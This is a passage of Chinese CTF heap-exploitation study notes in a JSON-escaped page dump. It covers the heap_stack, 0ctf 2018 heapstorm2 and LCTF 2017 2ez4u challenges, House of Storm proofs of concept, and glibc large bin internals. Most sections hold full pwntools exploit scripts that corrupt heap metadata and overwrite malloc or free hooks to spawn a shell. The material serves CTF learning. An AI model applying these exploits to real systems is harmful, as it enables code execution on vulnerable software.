puts(\"bad choice!\\n\"); break; } } } push函数 unsigned __int64 push() { __int64 nbytes; // ST00_8 size_t size; // ST08_8 void *buf; // ST10_8 unsigned __int64 v4; // [rsp+18h] [rbp-8h] v4 = __readfsqword(0x28u); if ( note_num[0] puuuuuush函数 unsigned __int64 puuuuuush() { __int64 size; // ST08_8 void *buf; // ST10_8 unsigned __int64 v3; // [rsp+18h] [rbp-8h] v3 = __readfsqword(0x28u); if ( puuuuuush_time && note_num[0] pop函数 unsigned __int64 pop() { unsigned __int64 v1; // [rsp+8h] [rbp-8h] v1 = __readfsqword(0x28u); if ( note_num[0] ) --note_num[0]; return __readfsqword(0x28u) ^ v1; } show函数 unsigned __int64 show() { unsigned __int64 v1; // [rsp+8h] [rbp-8h] v1 = __readfsqword(0x28u); if ( show_time ) { write(1, notes[note_num[0] - 1], 8uLL); --show_time; } return __readfsqword(0x28u) ^ v1; } push函数存在堆溢出问题申请0x1010的堆，实际得到0x20大小的chunk，并且可以写入0x1010个字节，并且它泄露了堆地址 puuuuuush函数属于不存在溢出的声请，这里可以用来声请大小>0x1000的chunk pop函数是是直接实现note_num-- show函数只能用一次，那么必然是泄露libcbase用 这里思路相对简单，直接给出exp from pwn import * context.update(arch='amd64',os='linux',timeout=1) context.log_level='debug' libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') def push1(size,content): p.sendlineafter('>> ','1') p.sendlineafter('size?',str(size)) p.sendafter('content?',content) def push2(size,content): p.sendlineafter('>> ','2') p.sendlineafter('size?',str(size)) p.sendafter('content?',content) def pop(): p.sendlineafter('>> ','3') def show(): p.sendlineafter('>> ','4') def pr(a,addr): log.success(a+'===>'+hex(addr)) def hack(): push1(0x1010,'\\x00'*0x18+p64(0xfe1)) p.recvuntil('Malloc at ') heapbase = int(p.recvuntil('.')[:-1],16) - 0x10 push2(0x2000,'\\x00') push1(0x10,'\\x78') show() leak = u64(p.recv(8)) libcbase = leak - (0x7fbec8029178 - 0x7fbec7c64000) _IO_list_all = libcbase + libc.sym['_IO_list_all'] system = libcbase + libc.sym['system'] pr('heapbase',heapbase) pr('libcbase',libcbase) pr('_IO_list_all',_IO_list_all) pr('system',system) fake_vtable_addr = heapbase + 0x60 + 0xd8 + 8 unsortedbin = '\\x00'*0x10 + '/bin/sh\\x00'+p64(0x61) unsortedbin += p64(0xdeadbeef) + p64(_IO_list_all - 0x10) unsortedbin += p64(0) + p64(1) unsortedbin = unsortedbin.ljust(0x10+0xd8,'\\x00') + p64(fake_vtable_addr) fake_vtable = p64(0)*3 + p64(system) payload = unsortedbin + fake_vtable push1(0x1010,payload) p.sendlineafter('>> ','1') p.sendlineafter('size?','16') #gdb.attach(p) p.interactive() while True: try: global p p = process('./heap_stack') hack() #break except: p.close() print 'trying...' 另外一种思路 house of lore + house of force #!/usr/bin/python #coding:utf-8 from pwn import * context.log_level='debug' context.update(arch='amd64',os='linux',timeout=1) io=process(\"./heap_stack\") libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') def push(size,ct='a'): io.sendlineafter(\">> \",'1') io.sendlineafter(\"size?\\n\",str(size)) io.sendafter(\"content?\\n\",ct) def puush(size,ct='a'):#1 io.sendlineafter(\">> \",'2') io.sendlineafter(\"size?\\n\",str(size)) io.sendlineafter(\"content?\\n\",ct) def pop(): io.sendlineafter(\">> \",'3') def show():#1 io.sendlineafter(\">> \",'4') def main(): push(0x1010,'a'*0x10+p64(0)+p64(0xfe1)) push(0xfe0) push(0x1fb0) show() libc_base=u64(io.recv(8))-0x3c5161+0x600 log.success(\"libc_base==>\"+hex(libc_base)) push(0x1010,'a'*0x10+p64(0)+p64(0xffffffffffffffff)) io.recvuntil(\"at \") top_chunk=int(io.recv(14),16)+0x10 log.success(\"top_chunk==>\"+hex(top_chunk)) malloc_hook=libc_base+0x3c4b10 realloc=libc_base+0x84710 ogg=libc_base+[0x45226,0x4527a,0xf0364,0xf1207][1] log.success(\"realloc==>\"+hex(realloc)) puush(malloc_hook - top_chunk -0x30) push(0x20,p64(0)+p64(ogg)+p64(realloc+4)) io.sendlineafter(\">> \",'1') io.sendlineafter(\"size?\\n\",str(0x10)) #gdb.attach(io,'b *{}'.format(ogg)) io.interactive() if __name__=='__main__': main() "},"pwn/heap_related/House_of_storm/House_of_storm.html":{"url":"pwn/heap_related/House_of_storm/House_of_storm.html","title":"House_of_storm","keywords":"","body":"House of storm 漏洞利用条件: 1.需要攻击者在largebin和unsorted_bin中分别布置一个chunk 这两个chunk需要在归位之后处于同一个largebin的index中且unsortedbin中的chunk要比largebin中的大 2.需要unsorted_bin中的bk指针可控 3.需要largebin中的bk指针和bk_nextsize指针可控 poc1(pie open) pie开启情况 house of storm效果：控制target // compiled: gcc -g -fPIC -pie House_of_Strom.c -o House_of_Strom #include #include #include struct { char padding[0x10]; // NULL padding char sh[0x10]; }global_container = {\"\",\"id\"}; int main() { char *unsorted_bin, *large_bin, *fake_chunk, *ptr; unsorted_bin = malloc(0x4f0-8); // size 0x4f0 // 防止合并 malloc(0x18); large_bin = malloc(0x4e0-8); // size 0x4e0 // 防止合并 malloc(0x18); // FIFO free(large_bin); // 先放小的chunk free(unsorted_bin); // large_bin 归位 unsorted_bin = malloc(0x4f0-8); // unsorted_bin 归位 free(unsorted_bin); //==============line============ fake_chunk = global_container.sh - 0x10; ((size_t *)unsorted_bin)[0] = 0; // unsorted_bin->fd ((size_t *)unsorted_bin)[1] = (size_t)fake_chunk; // unsorted_bin->bk ((size_t *)large_bin)[0] = 0; // large_bin->fd // 用于创建假块的“bk”，以避免从未排序的bin解链接时崩溃 ((size_t *)large_bin)[1] = (size_t)fake_chunk + 8; // large_bin->fd ((size_t *)large_bin)[2] = 0; // large_bin->fd_nextsize // 用于使用错误对齐技巧创建假块的“大小” ((size_t *)large_bin)[3] = (size_t)fake_chunk - 0x18 - 5; // large_bin->bk_nextsize ptr = malloc(0x48); strncpy(ptr, \"/bin/sh\", 0x48 - 1); system(global_container.sh); return 0; } 执行到==============line=================的时候，完成了unsorted bin和large bin各一个chunk，并且unsorted bin中的chunk更大 执行malloc(0x48)的过程草图（很草） 返回的指针：sh指向的地方。 poc2(no pie) // compiled: gcc -g -no-pie House_of_Strom.c -o House_of_Strom #include #include #include struct { char padding[0x10]; // NULL padding char sh[0x10]; }global_container = {\"\",\"id\"}; int main() { char *unsorted_bin, *large_bin, *fake_chunk, *ptr; unsorted_bin = malloc(0x4e8); // size 0x4f0 // 防止合并 malloc(0x18); large_bin = malloc(0x4d8); // size 0x4e0 // 防止合并 malloc(0x18); // FIFO free(large_bin); // 先放小的chunk free(unsorted_bin); // large_bin 归位 unsorted_bin = malloc(0x4e8); // unsorted_bin 归位 free(unsorted_bin); fake_chunk = global_container.sh - 0x10; ((size_t *)unsorted_bin)[0] = 0; // unsorted_bin->fd ((size_t *)unsorted_bin)[1] = (size_t)fake_chunk; // unsorted_bin->fd ((size_t *)large_bin)[0] = 0; // large_bin->fd // 用于创建假块的“bk”，以避免从未排序的bin解链接时崩溃 ((size_t *)large_bin)[1] = (size_t)fake_chunk + 8; // large_bin->fd ((size_t *)large_bin)[2] = 0; // large_bin->fd_nextsize // 用于使用错误对齐技巧创建假块的“大小” ((size_t *)large_bin)[3] = (size_t)fake_chunk - 0x18 - 2; // large_bin->bk_nextsize ptr = malloc(0x58); strncpy(ptr, \"/bin/sh\", 0x58 - 1); system(global_container.sh); return 0; } 原理和有PIE的情况是一样的，但是受随机化的影响，chunk的地址可能是0x610000-0x25d0000的任意一个内存页，所以概率是1/32，相对于有PIE的1/3的概率要小很多。 0ctf_2018_heapstorm2 程序提供了申请、编辑、释放、打印的功能，且打印只有在满足一定条件的情况下才会进行，默认时无法进行打印的。程序调用了mallopt(1, 0)使得程序没有fastbin，且通过mmap出来的内存地址0x13370800管理堆块，漏洞只有在编辑函数中存在一个off-by-null的漏洞。 可以使用off-by-null漏洞构造overlap chunk，但是无法泄露地址，只有一个已知的地址0x13370800，因此可以利用house of storm实现任意地址申请，将0x13370800申请出来，将该处内存块申请出来以后，我们就可以修改相应数据来实现可以打印，后续也可修改指针来实现任意地址读写，最后修改__free_hook为system拿到shell。 init_data 利用mallopt函数将fastbin关闭，并且通过mmap函数分配一段地址空间，空间的范围为0x13370000-0x13371000，通过fd=open(\"/dev/urandom\",0)去获取随机数，并往0x13370800地址开始写入24个字节。 for循环是将mmap开辟的地址填充随机数异或后的结果。 add 输入的size值的范围为0xc-0x1000，并且得到的堆块地址以及输入的size会通过异或再存入mmap的地址段中。 delete show show函数打印有前提条件，因此程序刚开始是不可以输入信息的，需要修改后才能输出。 edit exp from pwn import * #r = remote(\"node3.buuoj.cn\", 26141) r = process(\"./0ctf_2018_heapstorm2\") context.log_level = 'debug' elf = ELF(\"./0ctf_2018_heapstorm2\") libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') one_gadget_16 = [0x45216,0x4526a,0xf02a4,0xf1147] menu = \"Command: \" def add(size): r.recvuntil(menu) r.sendline('1') r.recvuntil(\"Size: \") r.sendline(str(size)) def delete(index): r.recvuntil(menu) r.sendline('3') r.recvuntil(\"Index: \") r.sendline(str(index)) def show(index): r.recvuntil(menu) r.sendline('4') r.recvuntil(\"Index: \") r.sendline(str(index)) def edit(index,content): r.recvuntil(menu) r.sendline('2') r.recvuntil(\"Index: \") r.sendline(str(index)) r.recvuntil(\"Size: \") r.sendline(str(len(content))) r.recvuntil(\"Content: \") r.send(content) add(0x18)#0 add(0x508)#1 add(0x18)#2 add(0x18)#3 add(0x508)#4 add(0x18)#5 add(0x18)#6 edit(1, 'a'*0x4f0+p64(0x500)) delete(1) edit(0, 'a'*(0x18-12)) add(0x18)#1 add(0x4d8)#7 delete(1) delete(2) add(0x38)#1 add(0x4e8)#2 edit(4, 'a'*0x4f0+p64(0x500)) delete(4) edit(3, 'a'*(0x18-12)) add(0x18)#4 add(0x4d8)#8 delete(4) delete(5) add(0x48)#4 delete(2) add(0x4e8)#2 delete(2) storage = 0x13370800 fake_chunk = storage - 0x20 payload = '\\x00' * 0x10 + p64(0) + p64(0x4f1) + p64(0) + p64(fake_chunk) edit(7, payload) payload = '\\x00' * 0x20 + p64(0) + p64(0x4e1) + p64(0) + p64(fake_chunk+8) + p64(0) + p64(fake_chunk-0x18-5) edit(8, payload) add(0x48) #0x133707e0 payload = p64(0)*4 + p64(0) + p64(0x13377331) + p64(storage) edit(2, payload) payload = p64(0)*2 + p64(0) + p64(0x13377331) + p64(storage) + p64(0x1000) + p64(fake_chunk+3) + p64(8) edit(0, payload) show(1) r.recvuntil(\"]: \") heap = u64(r.recv(6).ljust(8, '\\x00')) success(\"heap:\"+hex(heap)) payload = p64(0)*2 + p64(0) + p64(0x13377331) + p64(storage) + p64(0x1000) + p64(heap+0x10) + p64(8) edit(0, payload) show(1) r.recvuntil(\"]: \") malloc_hook = u64(r.recv(6).ljust(8, '\\x00')) -0x58 - 0x10 libc.address = malloc_hook - libc.sym['__malloc_hook'] free_hook = libc.sym['__free_hook'] system = libc.sym['system'] success(\"malloc_hook:\"+hex(malloc_hook)) payload = p64(0)*2 + p64(0) + p64(0x13377331) + p64(storage) + p64(0x1000) + p64(free_hook) + p64(0x100) + p64(storage+0x50) + p64(8) + '/bin/sh\\x00' edit(0, payload) edit(1, p64(system)) delete(2) r.interactive() 参考文章 https://www.anquanke.com/post/id/203096 https://blog.csdn.net/qq_38154820/article/details/107075631 "},"pwn/heap_related/how2heap学习/how2heap解析.html":{"url":"pwn/heap_related/how2heap学习/how2heap解析.html","title":"how2heap解析","keywords":"","body":"看到网上有个老哥总结的挺好 https://cloud.tencent.com/developer/article/1522043 "},"pwn/heap_related/large_bin_attack/large_bin_attack.html":{"url":"pwn/heap_related/large_bin_attack/large_bin_attack.html","title":"large_bin_attack","keywords":"","body":"large bin attack 大部分搬运自https://www.anquanke.com/post/id/183877#h2-0 malloc_chunk 搬运一下wiki写的malloc_chunk结构吧，这里主要注意fd_nextsize和bk_nextsize的含义。 /* This struct declaration is misleading (but accurate and necessary). It declares a \"view\" into memory allowing access to necessary fields at known offsets from a given base. See explanation below. */ struct malloc_chunk { INTERNAL_SIZE_T prev_size; /* Size of previous chunk (if free). */ INTERNAL_SIZE_T size; /* Size in bytes, including overhead. */ struct malloc_chunk* fd; /* double links -- used only if free. */ struct malloc_chunk* bk; /* Only used for large blocks: pointer to next larger size. */ struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */ struct malloc_chunk* bk_nextsize; }; 每个字段的具体的解释如下 prev_size, 如果该 chunk 的物理相邻的前一地址 chunk（两个指针的地址差值为前一 chunk 大小）是空闲的话，那该字段记录的是前一个 chunk 的大小 (包括 chunk 头)。否则，该字段可以用来存储物理相邻的前一个 chunk 的数据。这里的前一 chunk 指的是较低地址的 chunk 。 size，该 chunk 的大小，大小必须是 2 SIZE_SZ 的整数倍。如果申请的内存大小不是 2 SIZE_SZ 的整数倍，会被转换满足大小的最小的 2 * SIZE_SZ 的倍数。32 位系统中，SIZE_SZ 是 4；64 位系统中，SIZE_SZ 是 8。 该字段的低三个比特位对 chunk 的大小没有影响，它们从高到低分别表示 NON_MAIN_ARENA，记录当前 chunk 是否不属于主线程，1 表示不属于，0 表示属于。 IS_MAPPED，记录当前 chunk 是否是由 mmap 分配的。 PREV_INUSE，记录前一个 chunk 块是否被分配。一般来说，堆中第一个被分配的内存块的 size 字段的 P 位都会被设置为 1，以便于防止访问前面的非法内存。当一个 chunk 的 size 的 P 位为 0 时，我们能通过 prev_size 字段来获取上一个 chunk 的大小以及地址。这也方便进行空闲 chunk 之间的合并。 fd，bk， chunk 处于分配状态时，从 fd 字段开始是用户的数据。chunk 空闲时，会被添加到对应的空闲管理链表中，其字段的含义如下 fd 指向下一个（非物理相邻）空闲的 chunk bk 指向上一个（非物理相邻）空闲的 chunk 通过 fd 和 bk 可以将空闲的 chunk 块加入到空闲的 chunk 块链表进行统一管理 fd_nextsize， bk_nextsize，也是只有 chunk 空闲的时候才使用，不过其用于较大的 chunk（large chunk）。 fd_nextsize 指向前一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。 bk_nextsize 指向后一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。 一般空闲的 large chunk 在 fd 的遍历顺序中，按照由大到小的顺序排列。这样做可以避免在寻找合适 chunk 时挨个遍历。 large bin的大小范围 size与index对应的关系 size index [0x400 , 0x440) 64 [0x440 , 0x480) 65 [0x480 , 0x4C0) 66 [0x4C0 , 0x500) 67 [0x500 , 0x540) 68 等差 0x40 … [0xC00 , 0xC40) 96 [0xC40 , 0xE00) 97 [0xE00 , 0x1000) 98 [0x1000 , 0x1200) 99 [0x1200 , 0x1400) 100 [0x1400 , 0x1600) 101 等差 0x200 … [0x2800 , 0x2A00) 111 [0x2A00 , 0x3000) 112 [0x3000 , 0x4000) 113 [0x4000 , 0x5000) 114 等差 0x1000 … [0x9000 , 0xA000) 119 [0xA000 , 0x10000) 120 [0x10000 , 0x18000) 121 [0x18000 , 0x20000) 122 [0x20000 , 0x28000) 123 [0x28000 , 0x40000) 124 [0x40000 , 0x80000) 125 [0x80000 , …. ) 126 large bin的行为 在相同的index下 largebin的插入顺序不再是LIFO或FILO，而是一种全新的方式。 按照大小从大到小排序 若大小相同,按照free时间排序 若干个大小相同的堆块,只有首堆块的fd_nextsize和bk_nextsize会指向其他堆块,后面的堆块的fd_nextsize和bk_nextsize均为0 size最大的chunk的bk_nextsize指向最小的chunk; size最小的chunk的fd_nextsize指向最大的chunk large bin行为示例1 大小不同但属于一个bin的情况 放入同一large bin中的chunk会按照大小排列 #include #include int main() { char *gap; char *ptr0=malloc(0x400-0x10); //A gap=malloc(0x10); char *ptr1=malloc(0x410-0x10); //B gap=malloc(0x10); char *ptr2=malloc(0x420-0x10); //C gap=malloc(0x10); char *ptr3=malloc(0x430-0x10); //D gap=malloc(0x10); free(ptr2); free(ptr3); free(ptr0); free(ptr1); malloc(0x440); //trigger that sort largebin from unsorted bin to largebins return 0; } 执行完malloc(0x440)后，unsorted bin被清空 各chunk fd和bk的指向情况 各chunk fd_nextsize和bk_nextsize的指向情况 large bin行为示例2 chunk大小相同的情况 #include int main() { char *gap; char *ptr0=malloc(0x400-0x10); //A gap=malloc(0x10); char *ptr1=malloc(0x400-0x10); //B gap=malloc(0x10); char *ptr2=malloc(0x400-0x10); //C gap=malloc(0x10); char *ptr3=malloc(0x400-0x10); //D gap=malloc(0x10); free(ptr2); //C free(ptr3); //D free(ptr0); //A free(ptr1); //B malloc(0x440); //trigger that sort largebin from unsorted bin to largebins return 0; } 执行完malloc(0x440) 各chunk fd和bk的指向情况 各chunk fd_nextsize和bk_nextsize的指向情况 large bin行为示例3 既存在相同大小的堆块又存在不同大小的堆块管理示例 #include int main() { char *gap; char *ptr0=malloc(0x400-0x10); //A gap=malloc(0x10); char *ptr1=malloc(0x410-0x10); //B gap=malloc(0x10); char *ptr2=malloc(0x420-0x10); //C gap=malloc(0x10); char *ptr3=malloc(0x430-0x10); //D gap=malloc(0x10); char *ptr4=malloc(0x400-0x10); //E gap=malloc(0x10); char *ptr5=malloc(0x410-0x10); //F gap=malloc(0x10); char *ptr6=malloc(0x420-0x10); //G gap=malloc(0x10); char *ptr7=malloc(0x430-0x10); //H gap=malloc(0x10); free(ptr2); //C free(ptr3); //D free(ptr0); //A free(ptr1); //B free(ptr7); //H free(ptr6); //G free(ptr5); //F free(ptr4); //E malloc(0x440); //trigger that sort largebin from unsorted bin to largebins return 0; } malloc(0x400)后各chunk fd_nextsize和bk_nextsize的指向情况 largebin chunk从unsorted bin中取出源码 这个师傅总结的太好，实在忍不住抄作业 /* place chunk in bin */ if (in_smallbin_range (size)) { ... // chunk为smallbin，放入到smallbin中 } else { victim_index = largebin_index (size);//第一步，获取当前要插入的chunk对应的index bck = bin_at (av, victim_index); //当前index中最小的chunk fwd = bck->fd; //当前index中最大的chunk /* maintain large bins in sorted order */ if (fwd != bck) { // 该chunk对应的largebin index中不为空 /* Or with inuse bit to speed comparisons */ size |= PREV_INUSE; /* if smaller than smallest, bypass loop below */ assert ((bck->bk->size & NON_MAIN_ARENA) == 0); if ((unsigned long) (size) bk->size)) //第三步，如果要插入的chunk的size小于当前index中最小chunk的大小，则直接插入到最后面。 { fwd = bck; bck = bck->bk; victim->fd_nextsize = fwd->fd; victim->bk_nextsize = fwd->fd->bk_nextsize; fwd->fd->bk_nextsize = victim->bk_nextsize->fd_nextsize = victim; } else { assert ((fwd->size & NON_MAIN_ARENA) == 0); while ((unsigned long) size size) //第四步，如果插入的chunk不为最小，则通过`fd_nextsize`从大到小遍历chunk，找到小于等于要插入chunk的位置 { fwd = fwd->fd_nextsize; assert ((fwd->size & NON_MAIN_ARENA) == 0); } if ((unsigned long) size == (unsigned long) fwd->size) /* Always insert in the second position. */ fwd = fwd->fd; //第五步，如果存在堆头，则插入到堆头的下一个节点 else { //第六步，否则这个chunk将会成为堆头，`bk_nextsize`和`fd_nextsize`将被置位 victim->fd_nextsize = fwd; victim->bk_nextsize = fwd->bk_nextsize; fwd->bk_nextsize = victim; victim->bk_nextsize->fd_nextsize = victim; } bck = fwd->bk; } } else //第二步，chunk对应的largebin index中为空 victim->fd_nextsize = victim->bk_nextsize = victim; } mark_bin (av, victim_index); //设置fd与bk完成插入 victim->bk = bck; victim->fd = fwd; fwd->bk = victim; bck->fd = victim; ... } 整个流程可以总结为： 找到当前要插入的chunk对应的largebin的index，并定位该index中的最小的chunkbck和最大的chunkfwd。 如果fwd等于bck，表明当前链表为空，则直接将该chunk插入，并设置该chunk为该大小堆块的堆头，将bk_nextsize和fd_nextsize赋值为它本身。 如果fwd不等于bck，表明当前链表已经存在chunk，要做的就是找到当前chunk对应的位置将其插入。首先判断其大小是否小于最小chunk的size，(size) bk->size)，如果小于则说明该chunk为当前链表中最小的chunk，即插入位置在链表末尾，无需遍历链表，直接插入到链表的末尾，且该chunk没有对应的堆头，设置该chunk为相应堆大小堆的堆头，将bk_nextsize指向比它大的堆头，fd_nextsize指向双链表的第一个节点即最大的堆头。 如果当前chunk的size不是最小的chunk，则从双链表的第一个节点即最大的chunk的堆头开始遍历，通过fd_nextsize进行遍历，由于fd_nextsize指向的是比当前堆头小的堆头，因此可以加快遍历速度。直到找到小于等于要插入的chunk的size。 如果找到的chunk的size等于要插入chunk的size，则说明当前要插入的chunk的size已经存在堆头，那么只需将该chunk插入到堆头的下一个节点。 如果找到的chunk的size小于当前要插入chunk的size，则说明当前插入的chunk不存在堆头，因此该chunk会成为堆头插入到该位置，设置fd_nextsize与bk_nextsize。 从large bin中取chunk的源码 /* If a large request, scan through the chunks of current bin in sorted order to find smallest that fits. Use the skip list for this. */ if (!in_smallbin_range (nb)) { bin = bin_at (av, idx); //找到申请的size对应的largebin链表 /* skip scan if empty or largest chunk is too small */ if ((victim = first (bin)) != bin && (unsigned long) (victim->size) >= (unsigned long) (nb)) //第一步，判断链表的第一个结点，即最大的chunk是否大于要申请的size { victim = victim->bk_nextsize; while (((unsigned long) (size = chunksize (victim)) bk_nextsize; /* Avoid removing the first entry for a size so that the skip list does not have to be rerouted. */ if (victim != last (bin) && victim->size == victim->fd->size) //第三步，申请的chunk对应的chunk存在多个结点，则申请相应堆头的下个结点，不申请堆头。 victim = victim->fd; remainder_size = size - nb; unlink (av, victim, bck, fwd); //第四步，largebin unlink 操作 /* Exhaust */ if (remainder_size size |= NON_MAIN_ARENA; } /* Split */ else { remainder = chunk_at_offset (victim, nb); //第六步，如果当前剩余空间还可以构成chunk，则将剩余的空间放入到unsorted bin中。 /* We cannot assume the unsorted list is empty and therefore have to perform a complete insert here. */ bck = unsorted_chunks (av); fwd = bck->fd; if (__glibc_unlikely (fwd->bk != bck)) { errstr = \"malloc(): corrupted unsorted chunks\"; goto errout; } remainder->bk = bck; remainder->fd = fwd; bck->fd = remainder; fwd->bk = remainder; if (!in_smallbin_range (remainder_size)) { remainder->fd_nextsize = NULL; remainder->bk_nextsize = NULL; } set_head (victim, nb | PREV_INUSE | (av != &main_arena ? NON_MAIN_ARENA : 0)); set_head (remainder, remainder_size | PREV_INUSE); set_foot (remainder, remainder_size); } check_malloced_chunk (av, victim, nb); void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p; } } 可以将整个流程总结为： 找到当前要申请的空间对应的largebin链表，判断第一个结点即最大结点的大小是否大于要申请的空间，如果小于则说明largebin中没有合适的堆块，需采用其他分配方式。 如果当前largebin中存在合适的堆块，则从最小堆块开始，通过bk_nextsize反向遍历链表，找到大于等于当前申请空间的结点。 为减少操作，判断找到的相应结点（堆头）的下个结点是否是相同大小的堆块，如果是的话，将目标设置为该堆头的第二个结点，以此减少将fd_nextsize与bk_nextsize赋值的操作。 调用unlink将目标largebin chunk从双链表中取下。 判断剩余空间是否小于MINSIZE，如果小于直接返回给用户。 否则将剩余的空间构成新的chunk放入到unsorted bin中。 unlink /* Take a chunk off a bin list */ #define unlink(AV, P, BK, FD) { if (__builtin_expect (chunksize(P) != (next_chunk(P))->prev_size, 0)) malloc_printerr (check_action, \"corrupted size vs. prev_size\", P, AV); FD = P->fd; BK = P->bk; if (__builtin_expect (FD->bk != P || BK->fd != P, 0)) malloc_printerr (check_action, \"corrupted double-linked list\", P, AV); else { FD->bk = BK; BK->fd = FD; if (!in_smallbin_range (P->size) && __builtin_expect (P->fd_nextsize != NULL, 0)) { if (__builtin_expect (P->fd_nextsize->bk_nextsize != P, 0) || __builtin_expect (P->bk_nextsize->fd_nextsize != P, 0)) malloc_printerr (check_action, \"corrupted double-linked list (not small)\", P, AV); if (FD->fd_nextsize == NULL) { if (P->fd_nextsize == P) FD->fd_nextsize = FD->bk_nextsize = FD; else { FD->fd_nextsize = P->fd_nextsize; FD->bk_nextsize = P->bk_nextsize; P->fd_nextsize->bk_nextsize = FD; P->bk_nextsize->fd_nextsize = FD; } } else { P->fd_nextsize->bk_nextsize = P->bk_nextsize; P->bk_nextsize->fd_nextsize = P->fd_nextsize; } } } } 再看看largebin的unlink检查，从代码中可以看到，就是多了fd_nextsize和bk_nextsize俩个位置的检查，原理和fd和bk的检查一致。但是需要注意的是对于存在多个满足空间的堆块来说，申请出来的是堆头的下一个结点，它的fd_nextsize和bk_nextsize为空。也就是说即使它是largebin chunk，但是它的fd_nextsize也为空，即不满足条件__builtin_expect (P->fd_nextsize != NULL, 0)，对于此类chunk的unlink，只会像smallbin的unlink一样检查fd与bk，而不会对fd_nextsize与bk_nextsize进行检查与操作。 至此largebin链表的形成以及申请largebin都已经阐述清楚。再小结下，对于largebin的链表的插入，双链表是从大到小的chunk排序，相同大小的chunk会有一个堆头，只有堆头的fd_nextsize与bk_nextsize会被赋值，其余堆块的该字段为0。插入的遍历是通过fd_nextsize从大到小进行的，如果该插入的chunk存在对应堆头，则插入到该堆头的下一个结点，否则的话该chunk会成为堆头插入到链表中。 对于largebin的申请，通过判断双链表的第一个结点（最大结点）的大小来判断是否存在满足的堆块，如果有则从小到大通过bk_nextsize反向遍历双链表，找到最小的满足申请需求的堆块，如果该堆头下一个结点的大小也满足则将该结点作为目标分配给用户，以此减少链表的fd_nextsize与bk_nextsize操作，提高效率。对于双链表的unlink，需要注意的就是fd_nextsize与bk_nextsize检查，特别需要注意的是当结点是堆头的下一个结点时，它的fd_nextsize与bk_nextsize为0，此时unlink操作与smallbin的unlink操作一致，没有fd_nextsize与bk_nextsize的检查与操作。 LCTF-2017 2EZ4U exp #!/usr/bin/env python # coding=utf-8 from pwn import* #context.log_level='debug' def Add(l,d): p.sendlineafter('choice: ','1') p.sendlineafter('):','0') p.sendlineafter('):','0') p.sendlineafter('):','0') p.sendlineafter('):',str(l)) p.sendlineafter('apple:',d) def Edit(idx,d): p.sendlineafter('choice: ','3') p.sendlineafter('):',str(idx)) p.sendlineafter('):','0') p.sendlineafter('):','0') p.sendlineafter('):','0') p.sendlineafter('apple:',d) def Show(idx): p.sendlineafter('choice: ','4') p.sendlineafter('):',str(idx)) def Del(idx): p.sendlineafter('choice: ','2') p.sendlineafter('):',str(idx)) p=process('./2ez4u') libc=ELF('/lib/x86_64-linux-gnu/libc.so.6',checksec=False) Add(0x60,'0'*0x60)#0 Add(0x60,'1'*0x60)#1 Add(0x60,'2'*0x60)#2 Add(0x60,'3'*0x60)#3 Add(0x60,'4'*0x60)#4 Add(0x60,'5'*0x60)#5 Add(0x3f0,'7'*0x3f0)#6 Add(0x60, '8'*0x60 )#7 Add(0x3e0, '9'*0x3e0)#8 Add(0x60, '9'*0x80 )#9 Add(0x3f0, 'a'*0x3d0)#a Add(0x60-0x18, 'b'*0x30 )#b Add(0x60-0x18, 'c'*0x30 )#c Add(0x60-0x18, 'd'*0x30 )#d Del(8) Del(0xa) Del(0) Add(0x400,'')#1 Show(0xa) p.recvuntil('description:') heap_addr=u64(p.recvuntil('\\n',drop=True).ljust(8,'\\0'))-0x790 success('heap_addr:'+hex(heap_addr)) target_addr=heap_addr+0x130 #2 fchunk1_addr=heap_addr+0xb0 #1 fchunk2_addr=heap_addr+0x1b0 #3 fchunk3_addr=heap_addr+0xc10 #10 success('target_addr:'+hex(target_addr)) success('fchunk1_addr:'+hex(fchunk1_addr)) success('fchunk2_addr:'+hex(fchunk2_addr)) success('fchunk3_addr:'+hex(fchunk3_addr)) Edit(0xa,p64(target_addr)) ftarget=p64(0)*2+p64(0x411)+p64(fchunk1_addr-0x18)+p64(fchunk1_addr-0x10) ftarget+=p64(fchunk3_addr)+p64(fchunk2_addr) Edit(2,ftarget) fake=p64(0)+p64(target_addr) Edit(1,fake) fake=p64(0)*2+p64(0x421)+p64(0)*2+p64(target_addr) Edit(3,fake) Edit(6,'6'*0x218+p64(0x410)+p64(0x411)) Del(5) Del(3) Add(0x3f0,'3'*56)#3 Add(0x60,'')#5 Show(3) p.recvuntil('3'*56) libc_base=u64(p.recv(6).ljust(8,'\\0'))-0x3c4be8 success('libc_base:'+hex(libc_base)) free_hook=libc.sym['__free_hook']+libc_base success('free_hook:'+hex(free_hook)) system=libc_base+libc.sym['system'] #unsortbin attack Del(6) Del(3) pay=p64(0)*2+p64(0x411)+p64(heap_addr+0x280)+p64(free_hook-0x48) Edit(2,pay) Add(0x3f0,'') #fastbin attack pay=p64(0)*2+p64(0x71) Edit(2,pay) pay=p64(0)*6+p64(0x31)+p64(0)*3+p64(0x431) Edit(3,pay) Del(0xc) Del(0x3) pay=p64(0)*2+p64(0x71)+p64(free_hook-0x3b) Edit(2,pay) Add(0x60-0x18,'/bin/sh') pay='a'*0x13+p64(system) Add(0x60-0x18,pay) pay=p64(0)*2+p64(0x71)+'/bin/sh' Edit(2,pay) Del(3) p.interactive() 参考文章 https://xz.aliyun.com/t/5177 https://eternalsakura13.com/2018/03/21/lctf2/ "},"pwn/heap_related/ptmalloc_check/ptmalloc_check.html":{"url":"pwn/heap_related/ptmalloc_check/ptmalloc_check.html","title":"ptmalloc_check","keywords":"","body":"搬自wiki https://wiki.x10sec.org/pwn/linux/glibc-heap/ptmalloc_check-zh/ _int_malloc 初始检查 检查目标 检查条件 信息 申请的大小 REQUEST_OUT_OF_RANGE(req) ：((unsigned long) (req) >= (unsigned long) (INTERNAL_SIZE_T)(-2 * MINSIZE)) __set_errno(ENOMEM) fastbin 检查目标 检查条件 报错信息 chunk 大小 fastbin_index(chunksize(victim)) != idx malloc(): memory corruption (fast) Unsorted bin 检查目标 检查条件 报错信息 unsorted bin chunk 大小 chunksize_nomask (victim) \\ chunksize_nomask (victim) > av->system_mem malloc(): memory corruption top chunk 检查目标 检查条件 信息 top chunk size (unsigned long) (size) >= (unsigned long) (nb + MINSIZE) 方可进入 __libc_free mmap 块 检查目标 检查条件 信息 chunk size 标记位 chunk_is_mmapped (p) 方可进入 非 mmap 